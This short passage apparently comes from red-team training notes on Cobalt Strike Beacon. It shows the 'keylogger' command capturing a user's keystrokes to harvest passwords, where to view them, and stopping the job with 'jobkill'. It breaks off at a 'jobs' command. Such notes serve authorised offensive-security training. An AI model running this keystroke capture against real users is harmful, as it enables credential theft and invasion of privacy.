A keylogger can capture the keystrokes of a user, which is especially useful for capturing usernames, passwords and other sensitive information.
```
beacon> keylogger
[+] received keystrokes from *Untitled - Notepad by bfarmer
```
  

All keystrokes can be seen at _View > Keystrokes_.

The keylogger runs as a job that can be stopped with the `jobkill` command.
```
beacon> jobs
